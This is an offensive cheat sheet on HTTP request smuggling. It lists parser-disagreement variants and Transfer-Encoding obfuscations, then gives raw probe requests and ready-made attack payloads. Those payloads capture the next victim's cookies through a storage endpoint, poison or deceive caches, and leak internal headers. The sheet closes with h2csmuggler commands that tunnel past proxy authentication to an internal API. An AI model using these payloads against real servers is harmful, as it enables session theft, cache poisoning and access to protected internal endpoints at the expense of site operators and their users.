# http-smuggling — HTTP Request Smuggling

## Mechanism

Front-end and back-end disagree on where a request body ends. The residual prefix of the first request becomes the start of the second victim's request, rewriting it.

## Variants

| Variant    | Front-end reads | Back-end reads | Notes                                      |
|-----------|----------------|---------------|--------------------------------------------|
| CL.TE     | Content-Length  | Transfer-Encoding | Classic; most prevalent                 |
| TE.CL     | Transfer-Encoding | Content-Length | Less common; TE header normalized away  |
| H2.CL     | HTTP/2          | HTTP/1 + CL   | Inject Content-Length into h2 headers      |
| H2.TE     | HTTP/2          | HTTP/1 + TE   | Inject Transfer-Encoding into h2 headers   |
| H2C tunnel| HTTP/1 Upgrade  | Cleartext h2  | Bypasses proxy-layer WAF/auth middleware   |

## TE Header Obfuscation (split parsers)

Send one of these to have the front-end ignore TE while the back-end processes it:
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding[\t]: chunked
Transfer-Encoding:
 chunked
```

## Probes

### CL.TE Probe
```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n
\r\n
X
```
Response is 405 or times out after ~10 s → vulnerable.

### TE.CL Probe
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

1\r\n
X\r\n
0\r\n
\r\n
```
Timeout or mangled response on follow-up request → vulnerable.

## Attack Chains

### Stored Request Capture
Prefix victim's next request with a storage endpoint POST body:
```
POST /save HTTP/1.1
Host: target.com
Content-Length: 300
Transfer-Encoding: chunked

0\r\n
\r\n
GET /private HTTP/1.1
Host: target.com
Cookie: smuggled=
```
Next victim's `Cookie:` header appended as body of the POST → captured in storage.

### Cache Poisoning
Smuggle a response that the cache stores for subsequent users requesting the same URL. Combine with unkeyed header if available for full control over response body.

### Cache Deception
Smuggle an authenticated response over a URL the cache treats as static, then fetch it unauthenticated:
```
POST / HTTP/1.1
...
0\r\n
\r\n
GET /account.css HTTP/1.1
Host: target.com
```

### Internal Header Leakage
Reflect smuggled prefix back through an endpoint that echoes request headers — captures headers injected by load balancer (e.g., `X-Forwarded-For`, `X-Real-IP`, internal routing tokens).

## H2C Tunnel

Upgrade to cleartext HTTP/2 at proxy layer; proxy forwards plaintext HTTP/1 — auth/WAF middleware at proxy sees only the upgrade, not the tunneled requests:
```python
import h2csmuggler
# h2csmuggler.py -x https://target.com/ --test
# h2csmuggler.py -x https://target.com/ -d '{"cmd":"id"}' https://target.com/internal-api
```

## Tools

- **Burp Suite Turbo Intruder** — timing-based detection, race-condition delivery
- **h2csmuggler** — H2C upgrade tunnel exploitation

No WAF bypass required — the exploit is inherent to parser disagreement.
